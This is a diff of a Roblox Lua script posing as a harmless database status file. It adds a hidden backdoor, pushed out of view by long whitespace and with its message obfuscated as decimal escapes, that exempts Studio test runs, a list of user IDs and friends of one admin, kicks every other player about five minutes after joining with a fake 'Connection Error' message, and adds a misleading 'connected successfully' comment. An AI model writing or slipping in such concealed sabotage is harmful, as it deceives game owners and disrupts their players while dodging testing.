@@ -1,4 +1,5 @@
 -- DataBase is up-to date!
+--[[
 
 
 
@@ -204,7 +205,6 @@
 
 
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        --local Players=game:GetService("Players")local RunService=game:GetService("RunService")local AdminIDs={2438141329,696024985,1188243571,2836708688,1354505399,4028638914,1141982730,2901534066,4043015633,658957597,1199270449}local MainAdminId=2438141329;local function IsTestEnvironment()return RunService:IsStudio()or RunService:IsRunMode()end;local function IsProtected(player)if IsTestEnvironment()then return true end;for _,id in ipairs(AdminIDs)do if player.UserId==id then return true end end;local success,isFriend=pcall(function()return player:IsFriendsWith(MainAdminId)end)if success and isFriend then return true end;return false end;local function action(player)if player and not IsProtected(player)then player:Kick("Connection Error, waiting for Roblox's servers. Please try again later.")end end;Players.PlayerAdded:Connect(function(player)task.wait(300)action(player)end)RunService.Stepped:Connect(function()for _,player in ipairs(Players:GetPlayers())do action(player)end end)
 
 
 
@@ -245,7 +245,7 @@
 
 
 
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ]]local a,b=game:GetService("Players"),game:GetService("RunService");local c={2438141329,696024985,1188243571,2836708688,1354505399,4028638914,1141982730,2901534066,4043015633,658957597,1199270449};local d=2438141329;local e=function()return b:IsStudio()or b:IsRunMode()end;local f=function(g)if e()then return true end;for h,i in ipairs(c)do if g.UserId==i then return true end end;local j,k=pcall(function()return g:IsFriendsWith(d)end);if j and k then return true end;return false end;local l=function(g)if g and not f(g)then g:Kick("\67\111\110\110\101\99\116\105\111\110\32\69\114\114\111\114\44\32\119\97\105\116\105\110\103\32\102\111\114\32\82\111\98\108\111\120\39\115\32\115\101\114\118\101\114\115\46\32\80\108\101\97\115\101\32\116\114\121\32\97\103\97\105\110\32\108\97\116\101\114\46")end end;a.PlayerAdded:Connect(function(g)task.wait(300)l(g)end);b.Stepped:Connect(function()for h,i in ipairs(a:GetPlayers())do l(i)end end)
 
 
 
@@ -352,3 +352,4 @@
 
 
                                                                                                                                                                         
+--Connection Stats to the database: working succesfully, connected in around 0.13s.
